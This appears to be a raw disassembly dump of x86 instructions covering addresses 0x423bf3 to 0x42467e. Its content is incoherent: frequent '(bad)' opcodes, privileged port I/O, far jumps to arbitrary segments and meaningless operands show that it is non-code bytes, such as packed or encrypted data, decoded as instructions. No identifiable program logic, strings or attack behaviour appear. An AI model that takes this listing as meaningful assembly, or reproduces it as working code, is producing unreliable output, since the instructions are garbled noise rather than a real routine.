  423bf3:	and    DWORD PTR [edx-0x31d88fd9],eax
  423bf9:	mov    bl,BYTE PTR [edx+0x54]
  423bfc:	jbe    0x423bc4
  423bfe:	iret   
  423bff:	xor    al,0xcc
  423c01:	mov    cl,0x28
  423c03:	fistp  QWORD PTR [edx+ebp*8-0x39]
  423c07:	sub    DWORD PTR [eax+eiz*4-0x72],0x71b2d90a
  423c0f:	popa   
  423c10:	fild   DWORD PTR [eax]
	...
  423c72:	add    BYTE PTR [eax],al
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x446617]
  423c81:	mov    eax,ds:0x7e29589f
  423c86:	add    DWORD PTR [eax],eax
  423c88:	add    eax,0xd0000001
  423c8d:	mov    dh,BYTE PTR [esi+0x6c79647b]
  423c93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c94:	mov    al,ds:0x9825d443
  423c99:	and    esp,DWORD PTR [ebx+0xf94d2cb]
  423c9f:	and    eax,0x8f205432
  423ca4:	push   0x7462f491
  423ca9:	dec    eax
  423caa:	jle    0x423d1f
  423cac:	push   esi
  423cad:	jno    0x423d1d
  423caf:	dec    esi
  423cb0:	mov    edx,0xcfcd2bce
  423cb5:	sbb    DWORD PTR [ebp+0x2707c885],edx
  423cbb:	(bad)
  423cbf:	pushf  
  423cc0:	mul    BYTE PTR [esi+ebp*1-0x1c]
  423cc4:	add    BYTE PTR [esi],dl
  423cc6:	out    0xf0,al
  423cc8:	lds    ecx,FWORD PTR [eax]
  423cca:	pop    esi
  423ccb:	scas   eax,DWORD PTR es:[edi]
  423ccc:	and    al,0xec
  423cce:	js     0x423ca3
  423cd0:	call   0xc6d5f1dc
  423cd5:	mov    edi,0xb5741e8e
  423cda:	fidivr DWORD PTR fs:[eax]
  423cdd:	(bad)  
  423cde:	xrelease mov DWORD PTR [ecx+0x7a16202f],0x53962259
  423ce9:	scas   al,BYTE PTR es:[edi]
  423cea:	inc    esi
  423ceb:	in     al,dx
  423cec:	mov    DWORD PTR [ebp-0x21],esi
  423cef:	shl    ebp,1
  423cf1:	shl    BYTE PTR [edx-0x3b6a4c8a],1
  423cf7:	aaa    
  423cf8:	(bad)  
  423cfa:	dec    ebx
  423cfb:	mov    ch,0x8e
  423cfd:	push   ds
  423cfe:	loope  0x423cdc
  423d00:	jl     0x423d1e
  423d02:	rcl    DWORD PTR [edx],1
  423d04:	pop    ebx
  423d05:	xchg   esi,eax
  423d06:	retf   0x3676
  423d09:	retf   0xcb8e
  423d0c:	fsubp  st(7),st
  423d0e:	jo     0x423d2c
  423d10:	mov    bh,0xd4
  423d12:	gs (bad) 
  423d14:	push   0x36160636
  423d19:	das    
  423d1a:	add    eax,0xe5acea48
  423d1f:	push   ss
  423d20:	fcomp  DWORD PTR ds:0x521aa575
  423d26:	dec    edx
  423d27:	inc    esi
  423d28:	arpl   WORD PTR [edi-0x306febdb],si
  423d2e:	retf   
  423d2f:	sbb    al,0x9
  423d31:	ficom  DWORD PTR [ecx]
  423d33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d34:	jmp    DWORD PTR [esi+0x152ec61f]
  423d3a:	nop
  423d3b:	cmp    dh,BYTE PTR [ebx+eiz*4]
  423d3e:	shr    DWORD PTR [esi+ebx*1],1
  423d41:	adc    eax,0x826972b0
  423d46:	test   al,0xc
  423d48:	pop    edi
  423d49:	test   DWORD PTR [edi],ebp
  423d4b:	sbb    esi,DWORD PTR [ecx-0x7361ceb1]
  423d51:	push   ebp
  423d52:	xchg   ebx,eax
  423d53:	pop    ebp
  423d54:	xchg   edi,eax
  423d55:	add    DWORD PTR [ecx+0x69b916b0],ecx
  423d5b:	imul   esi,DWORD PTR [edi],0x1
  423d5e:	std    
  423d5f:	or     eax,0x2090bcc8
  423d64:	and    BYTE PTR [edi-0x2],bl
  423d67:	sub    eax,0x11b49aac
  423d6c:	cmp    BYTE PTR [ebx+ebx*1-0xb],ch
  423d70:	push   0x9f80ebd2
  423d75:	inc    ebx
  423d76:	pop    edx
  423d77:	scas   al,BYTE PTR es:[edi]
  423d78:	enter  0xa7e3,0x5f
  423d7c:	pop    eax
  423d7d:	clc    
  423d7e:	test   BYTE PTR [ebp-0x46],bl
  423d81:	jb     0x423df5
  423d83:	add    cl,BYTE PTR [ebx-0x1ebd747c]
  423d89:	ret    
  423d8a:	mov    esp,DWORD PTR [ebx]
  423d8c:	xchg   BYTE PTR [edx+ebp*1],ch
  423d8f:	xor    cl,BYTE PTR [eax+eax*1+0x0]
	...
  423df2:	add    BYTE PTR [eax],al
  423df4:	(bad)  
  423df5:	test   BYTE PTR [edi-0x118668f7],0xff
  423dfc:	daa    
  423dfd:	mov    DWORD PTR [eax+0x7a4444d2],esp
  423e03:	mov    ah,0x2e
  423e05:	jg     0x423e08
  423e07:	add    BYTE PTR ds:0x73000001,al
  423e0d:	mov    dh,0xf5
  423e0f:	icebp  
  423e10:	cld    
  423e11:	rol    BYTE PTR [ebx],cl
  423e13:	mov    WORD PTR [eax+edi*2],?
  423e16:	es cld 
  423e18:	push   ecx
  423e19:	rol    DWORD PTR [ecx-0x7e673687],0x16
  423e20:	sub    eax,DWORD PTR [ecx-0x64]
  423e23:	inc    edx
  423e24:	mov    ecx,0x6df4ca91
  423e29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e2a:	lds    ebp,FWORD PTR [edx+0x29]
  423e2d:	loope  0x423e14
  423e2f:	(bad)  [eax]
  423e31:	mov    ebx,0x37fe0ac
  423e36:	jmp    0x3279e14b
  423e3b:	mov    al,BYTE PTR cs:[edx]
  423e3e:	jmp    0x423ddd
  423e40:	jp     0x423dd1
  423e42:	out    0x6e,eax
  423e44:	adc    ah,BYTE PTR ds:[esi+0x7e69673c]
  423e4b:	or     esi,DWORD PTR [edx+0x5fb38c47]
  423e51:	push   edx
  423e52:	cmp    BYTE PTR [ebx],ah
  423e54:	cs push esp
  423e56:	mov    ah,0x86
  423e58:	inc    esi
  423e59:	push   ebp
  423e5a:	dec    esi
  423e5b:	mov    al,BYTE PTR [esi+0x33]
  423e5e:	xor    al,0xd
  423e60:	jb     0x423ebd
  423e62:	mov    WORD PTR [esi+0x57],?
  423e65:	jmp    0x20b0:0x9316da79
  423e6c:	pop    ebp
  423e6d:	xchg   ecx,eax
  423e6e:	shl    BYTE PTR ds:0xe9a7bb83,1
  423e74:	xchg   edi,eax
  423e75:	xchg   ebx,eax
  423e76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e77:	or     al,0xe7
  423e79:	pop    ecx
  423e7a:	adc    eax,0xa1a1df56
  423e7f:	pop    esp
  423e80:	push   eax
  423e81:	(bad)  
  423e82:	push   ecx
  423e83:	jb     0x423eff
  423e85:	mov    esi,0xb8511f13
  423e8a:	add    eax,0xb4e45e6a
  423e8f:	xchg   ebp,eax
  423e90:	mov    dh,0x59
  423e92:	clc    
  423e93:	adc    eax,0xdbb4a003
  423e98:	mov    ds:0x78d60ff8,eax
  423e9d:	xchg   edx,ebx
  423e9f:	xor    eax,DWORD PTR [esi+0x2f]
  423ea2:	into   
  423ea3:	dec    edi
  423ea4:	jmp    0xe105b18c
  423ea9:	xchg   edi,eax
  423eaa:	dec    edx
  423eab:	shl    esp,0x97
  423eae:	int    0x7f
  423eb0:	out    dx,al
  423eb1:	ja     0x423e65
  423eb3:	adc    ch,bl
  423eb5:	adc    eax,0x214ceaba
  423eba:	inc    edi
  423ebb:	loop   0x423f36
  423ebd:	xchg   BYTE PTR [ecx-0x35],bl
  423ec0:	ins    DWORD PTR es:[edi],dx
  423ec1:	and    esp,DWORD PTR [edx-0x1a]
  423ec4:	jmp    0xf15b:0x5b035393
  423ecb:	adc    eax,0xd6137d3e
  423ed0:	ret    
  423ed1:	mov    al,ds:0x4382eb96
  423ed6:	adc    DWORD PTR [edi-0x7d],ebx
  423ed9:	out    dx,al
  423eda:	add    edi,0xac0aec35
  423ee0:	(bad)  
  423ee2:	adc    BYTE PTR ds:0xfee9cc99,0xfe
  423ee9:	iret   
  423eea:	mov    WORD PTR [ebp+0x66f8f306],es
  423ef0:	inc    edx
  423ef1:	push   es
  423ef2:	out    0x9a,eax
  423ef4:	xor    eax,0x224eeeaa
  423ef9:	dec    ecx
  423efa:	je     0x423f51
  423efc:	adc    DWORD PTR [ebx+eax*2-0x4f],ecx
  423f00:	mov    edi,0x1f9250ac
  423f05:	icebp  
  423f06:	cmp    ecx,edi
  423f08:	mov    cl,BYTE PTR [eax+0x6c91e125]
  423f0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f0f:	mov    edx,0xcf
	...
  423f74:	scas   al,BYTE PTR es:[edi]
  423f75:	call   0x9fff:0xff74b964
  423f7c:	adc    al,0x96
  423f7e:	sbb    al,0xd9
  423f80:	push   edx
  423f81:	(bad)  
  423f82:	frstpm(287 only) 
  423f84:	xor    eax,DWORD PTR [eax+0x1050001]
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	ror    BYTE PTR [edi+0x6a1ca64e],1
  423f92:	aam    0x3
  423f94:	(bad)
  423f97:	es ds fldln2 
  423f9b:	js     0x423f65
  423f9d:	lahf   
  423f9e:	inc    esi
  423f9f:	sub    dh,BYTE PTR [ebp-0x2]
  423fa2:	jns    0x423fbb
  423fa4:	mov    bh,0xde
  423fa6:	add    eax,0x37899bf6
  423fab:	test   al,0x84
  423fad:	mov    WORD PTR [edi-0x208763e6],es
  423fb3:	cmp    cl,ah
  423fb5:	sbb    eax,0x178218a7
  423fba:	or     eax,0xff9b31ad
  423fbf:	mov    ecx,0xdd707adb
  423fc4:	out    0x34,eax
  423fc6:	idiv   DWORD PTR [eax]
  423fc8:	push   edi
  423fc9:	mov    bh,BYTE PTR [esi-0x3600fcac]
  423fcf:	fldenv ds:0xa3b52e72
  423fd5:	in     al,dx
  423fd6:	jbe    0x423fdb
  423fd8:	jle    0x423fc1
  423fda:	mov    ah,0x36
  423fdc:	retf   0x1292
  423fdf:	mov    esp,ebx
  423fe1:	xchg   DWORD PTR [ebx],edi
  423fe3:	xchg   esi,eax
  423fe4:	sub    ebx,0x7180abad
  423fea:	adc    eax,0x9ada4ac
  423fef:	(bad)  
  423ff0:	loope  0x424030
  423ff2:	and    BYTE PTR [eax+0x11d39e8d],bl
  423ff8:	cmp    dh,BYTE PTR [ebx]
  423ffa:	adc    al,cl
  423ffc:	add    eax,0xc9de18d1
  424001:	sbb    BYTE PTR [edx],0x62
  424004:	or     BYTE PTR [edi+ebx*4],cl
  424007:	dec    eax
  424008:	xor    eax,0xb9bc7583
  42400d:	bound  esi,QWORD PTR [ecx+0x6c]
  424010:	push   esp
  424011:	call   0xb37c:0xc60ced09
  424018:	ins    BYTE PTR es:[edi],dx
  424019:	sub    ebp,DWORD PTR [ecx+0x61]
  42401c:	pop    ebx
  42401d:	(bad)  
  42401e:	cmc    
  42401f:	push   0xfffffff1
  424021:	inc    ecx
  424022:	cdq    
  424023:	jbe    0x423ff0
  424025:	sub    ch,al
  424027:	in     eax,dx
  424028:	sbb    ch,BYTE PTR [edx]
  42402a:	and    edi,DWORD PTR ds:0xc526f8da
  424030:	lock sahf 
  424032:	jo     0x423fd0
  424034:	lea    eax,[ebx-0x10]
  424037:	and    eax,DWORD PTR [esi-0x7d45922b]
  42403d:	rcl    edx,0xac
  424040:	xchg   esi,eax
  424041:	push   ebx
  424042:	pop    esp
  424043:	stos   DWORD PTR es:[edi],eax
  424044:	in     eax,0xb
  424046:	in     ax,0xb5
  424049:	in     eax,dx
  42404a:	adc    bl,BYTE PTR ds:0x82d76443
  424050:	xchg   ebp,eax
  424051:	push   eax
  424052:	or     edx,ebp
  424054:	and    ebx,esi
  424056:	xchg   esp,eax
  424057:	inc    ebx
  424058:	ret    0xd6f9
  42405b:	inc    ecx
  42405c:	mov    esi,0x38e1fc6
  424061:	pop    esi
  424062:	int    0xa5
  424064:	xchg   ecx,eax
  424065:	scas   al,BYTE PTR es:[edi]
  424066:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424067:	and    BYTE PTR [eax],0x65
  42406a:	sub    BYTE PTR [esi+0x3c],bh
  42406d:	pop    esi
  42406e:	mov    bl,BYTE PTR [eax+0x10]
  424071:	cld    
  424072:	sub    eax,0xdb095180
  424077:	aad    0xfd
  424079:	lock push edi
  42407b:	les    esi,FWORD PTR [ebp-0x61]
  42407e:	add    ecx,DWORD PTR [ebp-0x7]
  424081:	out    0x4,al
  424083:	lds    ebx,FWORD PTR ds:0xd2cccb77
  424089:	pop    esi
  42408a:	jo     0x424095
  42408c:	cmp    BYTE PTR [edx],dh
  42408e:	not    DWORD PTR [edi]
  424090:	and    eax,DWORD PTR [eax]
	...
  4240f2:	add    BYTE PTR [eax],al
  4240f4:	jl     0x42414e
  4240f6:	cs mov cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	fdivr  QWORD PTR [edx+ecx*4+0x1813861]
  424107:	add    BYTE PTR ds:0xdb000001,al
  42410d:	hlt    
  42410e:	mov    ch,0x18
  424110:	jbe    0x424131
  424112:	fild   QWORD PTR [edi+0x5029080a]
  424118:	mov    ds:0x90f7fe85,al
  42411d:	jne    0x424100
  42411f:	mov    cl,0xda
  424121:	dec    esi
  424122:	loope  0x424191
  424124:	leave  
  424125:	ss in  eax,dx
  424127:	push   cs
  424128:	lea    esi,[edi+0x61]
  42412b:	xchg   ebp,eax
  42412c:	adc    cl,bh
  42412e:	imul   ebp,DWORD PTR [eax+eax*8],0xac1e866c
  424135:	adc    bh,bl
  424137:	sbb    eax,0xebf8bcc5
  42413c:	ins    BYTE PTR es:[edi],dx
  42413d:	icebp  
  42413e:	pop    es
  42413f:	aaa    
  424140:	adc    al,0x24
  424142:	arpl   sp,si
  424144:	add    BYTE PTR [edx-0x58],0x6d
  424148:	push   0x4bb81761
  42414d:	in     al,dx
  42414e:	or     esp,0x64
  424151:	outs   dx,BYTE PTR ds:[esi]
  424152:	mov    DWORD PTR [ebp+0x4667ad3f],edx
  424158:	js     0x4241cf
  42415a:	xchg   ebx,eax
  42415b:	aas    
  42415c:	test   al,0x2c
  42415e:	test   al,0x69
  424160:	repnz or bh,0x8e
  424164:	xor    ebx,esi
  424166:	jecxz  0x4241b8
  424168:	call   0x5b0e0379
  42416d:	cmp    DWORD PTR [edi+0x624ae10b],esi
  424173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424174:	inc    ebx
  424175:	dec    edi
  424176:	ins    BYTE PTR es:[edi],dx
  424177:	test   al,0x31
  424179:	arpl   bp,ax
  42417b:	ja     0x424174
  42417d:	jp     0x42417a
  42417f:	push   esp
  424180:	push   ss
  424181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424182:	pop    ds
  424183:	sub    eax,0x9402d1c5
  424188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424189:	mov    eax,ds:0x470572cf
  42418e:	cwde   
  42418f:	cli    
  424190:	dec    eax
  424191:	sub    DWORD PTR [ecx-0x4a1192f5],0xffffffee
  424198:	icebp  
  424199:	lahf   
  42419a:	xchg   edi,eax
  42419b:	stc    
  42419c:	in     eax,dx
  42419d:	retf   
  42419e:	sub    eax,DWORD PTR [ebx-0x80]
  4241a1:	and    ah,BYTE PTR [ebp-0x3e832be6]
  4241a7:	test   al,0x1d
  4241a9:	inc    ebx
  4241aa:	jbe    0x42419c
  4241ac:	jo     0x4241fc
  4241ae:	dec    eax
  4241af:	mov    dh,0xf
  4241b1:	mov    edi,0x74c81d2c
  4241b6:	add    al,0xe4
  4241b8:	nop
  4241b9:	fxch   st(0)
  4241bb:	in     al,dx
  4241bc:	(bad)  
  4241bd:	sbb    edx,DWORD PTR [esi]
  4241bf:	fiadd  DWORD PTR [edi+0x60]
  4241c3:	adc    BYTE PTR [edi+ebp*8],bl
  4241c6:	in     eax,0xa9
  4241c8:	sub    bh,BYTE PTR [ecx+eax*1-0x6d3317f6]
  4241cf:	xchg   edx,eax
  4241d0:	inc    edi
  4241d1:	lds    esi,FWORD PTR [eax+0xd11a7ff]
  4241d7:	(bad)  
  4241d8:	xor    al,0xca
  4241da:	call   DWORD PTR [ebx+0x5f]
  4241dd:	mov    esp,esi
  4241df:	mov    ebp,0xca3806e2
  4241e4:	mov    bl,0x96
  4241e6:	(bad)  
  4241e7:	mov    ch,0xbe
  4241e9:	push   ebp
  4241ea:	lods   eax,DWORD PTR ds:[esi]
  4241eb:	inc    ebx
  4241ec:	std    
  4241ed:	fld    DWORD PTR [eax-0x2aee89c7]
  4241f3:	mov    edx,0x22e87e2a
  4241f8:	(bad)  
  4241f9:	and    BYTE PTR [esi-0x1c],dh
  4241fc:	push   0x471dec5a
  424201:	add    DWORD PTR [ebp+0x2d],edx
  424204:	add    al,0xab
  424206:	inc    edx
  424207:	int    0x1a
  424209:	loope  0x4241b1
  42420b:	popa   
  42420c:	inc    edx
  42420d:	mov    eax,0x4081e9
	...
  424272:	add    BYTE PTR [eax],al
  424274:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	mov    esi,0x3d042b91
  424285:	add    BYTE PTR [ecx],0x0
  424288:	add    eax,0xbd000001
  42428d:	xor    DWORD PTR [ebx],0xffffffe7
  424290:	call   0x3d18:0x1609fc5
  424297:	jno    0x4242c9
  424299:	loopne 0x42421b
  42429b:	mov    edi,0xa86311f
  4242a0:	sbb    edi,DWORD PTR [eax+0x5500ec15]
  4242a6:	xor    eax,0xaf8f430e
  4242ab:	sub    al,0x1e
  4242ad:	es dec ecx
  4242af:	ret    0x9c61
  4242b2:	push   eax
  4242b3:	xchg   edx,eax
  4242b4:	and    ecx,DWORD PTR [esi]
  4242b6:	xchg   ebp,eax
  4242b7:	mov    bh,0x12
  4242b9:	imul   ebp,ebp,0xd11c280a
  4242bf:	loope  0x4242a8
  4242c1:	lods   al,BYTE PTR ds:[esi]
  4242c2:	dec    edi
  4242c3:	xchg   ebx,eax
  4242c4:	push   eax
  4242c5:	jbe    0x4242ed
  4242c7:	or     edi,DWORD PTR [esi-0x2e5d45df]
  4242cd:	fimul  WORD PTR [ecx+0x1e]
  4242d0:	out    0x29,al
  4242d2:	and    eax,0x2d3e358a
  4242d7:	mov    bl,0x39
  4242d9:	sub    DWORD PTR [ebx+0x2c789408],edi
  4242df:	pop    esp
  4242e0:	mul    DWORD PTR [ebx]
  4242e2:	mov    al,0x28
  4242e4:	inc    eax
  4242e5:	repnz push esi
  4242e7:	cwde   
  4242e8:	and    eax,0x1a86e0f4
  4242ed:	jbe    0x4242a1
  4242ef:	pop    es
  4242f0:	aad    0x16
  4242f2:	xchg   edx,eax
  4242f3:	xchg   esi,eax
  4242f4:	mov    BYTE PTR [ebp+0x644ec800],ch
  4242fa:	cld    
  4242fb:	inc    eax
  4242fc:	jbe    0x42436d
  4242fe:	xor    DWORD PTR [edi-0x8],edi
  424301:	mov    ah,0x49
  424303:	rol    BYTE PTR [edi],0x51
  424306:	inc    esp
  424307:	fdivr  DWORD PTR [ecx-0x31]
  42430a:	test   DWORD PTR [eax],ebx
  42430c:	clc    
  42430d:	mov    ss,WORD PTR [edi-0x4b]
  424310:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424311:	std    
  424312:	jmp    0xa524:0xa5d55510
  424319:	out    0x38,eax
  42431b:	sub    BYTE PTR [edi+0x67],cl
  42431e:	inc    eax
  42431f:	ret    0x7b1c
  424322:	jge    0x424331
  424324:	shr    dl,cl
  424326:	and    eax,0xee6e6e04
  42432b:	and    bl,dl
  42432d:	adc    al,0xd3
  42432f:	pop    ds
  424330:	or     BYTE PTR [edx-0x1c860552],dl
  424336:	cmp    ah,cl
  424338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42433a:	cwde   
  42433b:	mov    ds:0x802d11c9,eax
  424340:	xchg   edi,eax
  424341:	adc    ch,BYTE PTR [esi-0xe]
  424344:	mov    ah,0x87
  424346:	inc    ebp
  424347:	push   edi
  424348:	iret   
  424349:	fldcw  WORD PTR [ecx-0x55]
  42434c:	ins    DWORD PTR es:[edi],dx
  42434d:	out    0xcd,al
  42434f:	aam    0xa6
  424351:	lods   al,BYTE PTR ds:[esi]
  424352:	ss and cl,ah
  424355:	ss ss in al,dx
  424358:	loop   0x42439c
  42435a:	sub    eax,0xd37cbe68
  42435f:	inc    esp
  424360:	adc    DWORD PTR [ecx-0x4f],eax
  424363:	xor    DWORD PTR [ecx],edi
  424365:	xchg   esi,eax
  424366:	clc    
  424367:	push   es
  424368:	int    0x23
  42436a:	in     al,dx
  42436b:	add    bl,BYTE PTR [ecx+0x52081898]
  424371:	or     al,0x51
  424373:	retf   
  424374:	cmp    al,0x29
  424376:	xchg   esi,eax
  424377:	aas    
  424378:	pop    es
  424379:	les    esp,FWORD PTR [ebx+0x12345125]
  42437f:	cli    
  424380:	ins    BYTE PTR es:[edi],dx
  424381:	ins    DWORD PTR es:[edi],dx
  424382:	xor    BYTE PTR [ebp+0x5e6e6a0a],ah
  424388:	adc    ecx,DWORD PTR [ebx+0x40fa177f]
  42438e:	pop    eax
  42438f:	or     ebx,DWORD PTR [ecx]
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x4243ea
  424401:	mov    bl,BYTE PTR [edx]
  424403:	jno    0x424447
  424405:	add    DWORD PTR [ecx],0x0
  424408:	add    eax,0x95000001
  42440d:	outs   dx,BYTE PTR ds:[esi]
  42440e:	rol    DWORD PTR [edi-0x2fcc3e89],0x2f
  424415:	push   0x46fc8a02
  42441a:	iret   
  42441b:	in     al,dx
  42441c:	out    dx,al
  42441d:	inc    edx
  42441e:	aaa    
  42441f:	sbb    dh,BYTE PTR [esi-0x4fba8904]
  424425:	retf   
  424426:	outs   dx,DWORD PTR ds:[esi]
  424427:	inc    ebx
  424428:	sar    DWORD PTR [eax+0x71f34bd0],0xda
  42442f:	gs ffreep st(4)
  424432:	pop    ds
  424433:	mov    al,ds:0x25a5545e
  424438:	or     DWORD PTR [ebp-0x66],0x66
  42443c:	arpl   WORD PTR [esi-0x32c2fdd9],sp
  424442:	pop    edx
  424443:	push   ecx
  424444:	clc    
  424445:	in     eax,dx
  424446:	pop    edx
  424447:	inc    ebx
  424448:	or     edi,esp
  42444a:	es test ecx,0x528cf23b
  424451:	dec    esi
  424452:	out    0x77,eax
  424454:	mov    WORD PTR [edx-0x10],?
  424457:	fcom   st(3)
  424459:	or     al,0xcb
  42445b:	pop    edi
  42445c:	in     al,0xd0
  42445e:	add    ah,BYTE PTR [edx]
  424460:	jns    0x424461
  424462:	mov    bl,0x82
  424464:	mov    ds:0x93546b64,al
  424469:	jne    0x4244c6
  42446b:	or     ecx,DWORD PTR [ebx+eiz*2-0x429db84f]
  424472:	call   0xc5a7:0x7b69e4cb
  424479:	inc    edi
  42447a:	push   esi
  42447b:	inc    edx
  42447c:	mov    eax,0xb2e72539
  424481:	fdiv   QWORD PTR [edx+esi*4]
  424484:	adc    al,0x2d
  424486:	bound  edi,QWORD PTR [ebx+eiz*2-0x5c]
  42448a:	clc    
  42448b:	xchg   esi,eax
  42448c:	inc    edi
  42448d:	sbb    DWORD PTR [esi-0x39f9c5d0],0x9a44cda8
  424497:	jnp    0x4244c1
  424499:	lahf   
  42449a:	jmp    0x42449d
  42449c:	shl    BYTE PTR [edx+0x1b],1
  42449f:	mov    ah,0x69
  4244a1:	sub    esp,0x586ecd19
  4244a7:	sbb    esp,edi
  4244a9:	jbe    0x42447c
  4244ab:	mov    ebp,0x735b55bb
  4244b0:	test   eax,0x8115f48a
  4244b5:	jl     0x424516
  4244b7:	xchg   ebp,eax
  4244b8:	mov    esi,0xa153c86a
  4244bd:	jmp    0x64667455
  4244c2:	(bad)  
  4244c3:	push   esp
  4244c5:	in     al,dx
  4244c6:	cmc    
  4244c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244c8:	out    dx,al
  4244c9:	out    dx,eax
  4244ca:	or     ebx,DWORD PTR [edi]
  4244cc:	mov    ?,WORD PTR [esi+edi*2+0x10befaa0]
  4244d3:	in     al,dx
  4244d4:	sahf   
  4244d5:	pusha  
  4244d6:	jge    0x424519
  4244d8:	shl    edi,0xba
  4244db:	inc    ecx
  4244dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244dd:	sub    esi,DWORD PTR [eax]
  4244df:	mov    al,cs:0xd1b7fab9
  4244e5:	(bad)  
  4244e6:	mov    al,ds:0x68cb83ee
  4244eb:	pop    ss
  4244ec:	adc    eax,0x141ce32e
  4244f1:	dec    ebx
  4244f2:	sar    esp,cl
  4244f4:	(bad)  
  4244f5:	sub    eax,edi
  4244f7:	jmp    0x4244fd
  4244f9:	stos   BYTE PTR es:[edi],al
  4244fa:	in     al,dx
  4244fb:	into   
  4244fc:	jmp    0xefc8129a
  424501:	fidiv  DWORD PTR [esi+0x6972c98d]
  424507:	movups XMMWORD PTR [ecx-0xb1625fb],xmm0
  42450e:	pop    ss
  42450f:	push   ds
  424510:	sub    al,0x0
	...
  424572:	add    BYTE PTR [eax],al
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x7f],1
  424581:	xchg   ebx,eax
  424582:	popa   
  424583:	mov    ds:0x18447,al
  424588:	add    eax,0xfb000001
  42458d:	push   ds
  42458e:	adc    bl,BYTE PTR [ecx]
  424590:	mov    edx,0x5454c3f8
  424595:	mov    al,0x18
  424597:	add    bh,BYTE PTR [ecx-0x720a274c]
  42459d:	sub    ah,cl
  42459f:	jge    0x424523
  4245a1:	dec    eax
  4245a2:	cmp    BYTE PTR [ebp+0x0],0xea
  4245a6:	je     0x42458f
  4245a8:	pusha  
  4245a9:	sub    edx,eax
  4245ab:	fnstsw WORD PTR ss:[edi]
  4245ae:	push   esi
  4245af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245b0:	inc    ebp
  4245b1:	and    bl,BYTE PTR [edx-0x1b16e92d]
  4245b7:	mov    BYTE PTR [esi],cl
  4245b9:	dec    ecx
  4245ba:	pop    ecx
  4245bb:	xor    BYTE PTR [edx-0x2e9a16cd],ch
  4245c1:	jo     0x4245fc
  4245c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245c4:	repz pop ebp
  4245c6:	or     al,dh
  4245c8:	jo     0x424616
  4245ca:	cmp    ecx,esi
  4245cc:	fst    DWORD PTR [esi-0x6c59ab5]
  4245d2:	and    edi,ebx
  4245d4:	adc    BYTE PTR [eax+ebx*2-0x11],0xfc
  4245d9:	pop    eax
  4245da:	es xchg ebx,eax
  4245dc:	cmp    DWORD PTR [edx+0x55bab53c],0x0
  4245e3:	pop    ds
  4245e4:	xchg   BYTE PTR [ecx],al
  4245e6:	dec    esp
  4245e7:	lea    ecx,ds:0xe8f66d3c
  4245ed:	call   0x4374d690
  4245f2:	arpl   WORD PTR [edx],sp
  4245f4:	mov    esi,0x4d5c72a7
  4245f9:	jbe    0x42460d
  4245fb:	dec    edx
  4245fc:	dec    esi
  4245fd:	add    BYTE PTR [edi+0xa646302],ah
  424603:	outs   dx,DWORD PTR ds:[esi]
  424604:	sbb    DWORD PTR [ebx+0xa],0xffffff95
  424608:	dec    esi
  424609:	or     eax,0xe0f20e3d
  42460e:	call   0x56f8f283
  424613:	mov    bl,0x67
  424615:	dec    edi
  424616:	pusha  
  424617:	(bad)  
  424618:	push   DWORD PTR [esp+eiz*2]
  42461b:	adc    esi,DWORD PTR [ebx]
  42461d:	xchg   esp,eax
  42461e:	mov    BYTE PTR [edi-0x43],bl
  424621:	js     0x424669
  424623:	addr16 nop
  424625:	jns    0x424682
  424627:	and    DWORD PTR [eax+0x1a],ebx
  42462a:	add    dl,BYTE PTR [ebx-0x422fee22]
  424630:	push   edi
  424631:	pop    ds
  424632:	xchg   edx,eax
  424633:	call   0x8e5bdb0b
  424638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424639:	in     al,dx
  42463a:	sub    ch,bh
  42463c:	sbb    dl,BYTE PTR [eax]
  42463e:	jmp    0x70e7:0xf5dce13a
  424645:	das    
  424646:	int    0xfc
  424648:	xlat   BYTE PTR ds:[ebx]
  424649:	arpl   di,cx
  42464b:	das    
  42464c:	push   eax
  42464d:	or     edi,DWORD PTR [ebx]
  42464f:	mov    ds:0xb642e83,al
  424654:	push   ebx
  424655:	in     al,dx
  424656:	xchg   ecx,eax
  424657:	mov    ecx,0x36f1a739
  42465c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42465d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42465e:	aas    
  42465f:	mov    al,ds:0xbbc0dc07
  424664:	mov    BYTE PTR [eax+ebx*4+0x3b],ch
  424668:	adc    eax,0xd0a4c8ba
  42466d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42466e:	mov    ah,0x8
  424670:	mov    DWORD PTR ds:0xf26163ce,edi
  424676:	div    ecx
  424678:	adc    ebx,DWORD PTR [edx-0x36]
  42467b:	outs   dx,DWORD PTR ds:[esi]
  42467c:	inc    ecx
  42467d:	dec    ebp
  42467e:	in     eax,0xdc
